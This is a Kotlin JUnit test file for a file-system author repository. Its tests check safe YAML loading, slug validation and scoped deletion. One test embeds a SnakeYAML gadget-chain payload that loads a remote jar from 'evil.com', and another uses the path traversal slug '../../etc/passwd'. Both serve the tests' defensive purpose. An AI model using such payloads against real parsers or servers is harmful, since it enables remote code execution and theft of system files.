package io.github.rygel.fragments

import kotlinx.coroutines.runBlocking
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertThrows
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.io.TempDir
import java.io.File
import java.nio.file.Path

class FileSystemAuthorRepositoryTest {
    @TempDir
    lateinit var tempDir: Path

    private lateinit var repository: FileSystemAuthorRepository

    @BeforeEach
    fun setUp() {
        repository = FileSystemAuthorRepository(tempDir)
    }

    @Test
    fun safeConstructorPreventsArbitraryObjectInstantiation() {
        val maliciousYaml =
            """
            slug: test
            name: test
            bio: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/exploit.jar"]]]]
            """.trimIndent()
        val authorsDir = File(tempDir.toFile(), "authors")
        authorsDir.mkdirs()
        val authorFile = File(authorsDir, "evil.author.yml")
        authorFile.writeText(maliciousYaml)

        val authors = runBlocking { repository.getAll() }
        val evilAuthor = authors.firstOrNull { it.slug == "test" }
        assertTrue(
            evilAuthor == null || evilAuthor.bio !is javax.script.ScriptEngineManager,
            "SafeConstructor should prevent arbitrary Java object instantiation via !! tags",
        )
    }

    @Test
    fun rejectsAuthorSlugWithPathTraversal() {
        val author = Author(id = "evil", slug = "../../etc/passwd", name = "Evil")
        assertThrows(IllegalArgumentException::class.java) {
            runBlocking { repository.register(author) }
        }
    }

    @Test
    fun rejectsAuthorSlugWithSpecialCharacters() {
        val author = Author(id = "test", slug = "hello world!", name = "Test")
        assertThrows(IllegalArgumentException::class.java) {
            runBlocking { repository.register(author) }
        }
    }

    @Test
    fun rejectsAuthorSlugWithDotDotSegment() {
        val author = Author(id = "dotdot", slug = "..", name = "DotDot")
        assertThrows(IllegalArgumentException::class.java) {
            runBlocking { repository.register(author) }
        }
    }

    @Test
    fun clearOnlyDeletesAuthorFiles() =
        runBlocking {
            val authorsDir = File(tempDir.toFile(), "authors")
            authorsDir.mkdirs()
            val keepFile = File(authorsDir, "important-notes.txt")
            keepFile.writeText("do not delete me")
            val authorFile = File(authorsDir, "test.author.yml")
            authorFile.writeText("slug: test\nname: Test")

            repository.clear()

            assertTrue(keepFile.exists(), "Non-author file should not be deleted")
            assertFalse(authorFile.exists(), "Author file should be deleted")
        }

    @Test
    fun acceptsValidAuthorSlug() =
        runBlocking {
            val author = Author(id = "john", slug = "john-doe", name = "John Doe")
            repository.register(author)

            val result = repository.getBySlug("john-doe")
            assertEquals("John Doe", result?.name)
        }

    @Test
    fun acceptsSingleWordSlug() =
        runBlocking {
            val author = Author(id = "alice", slug = "alice", name = "Alice")
            repository.register(author)

            val result = repository.getBySlug("alice")
            assertEquals("Alice", result?.name)
        }
}
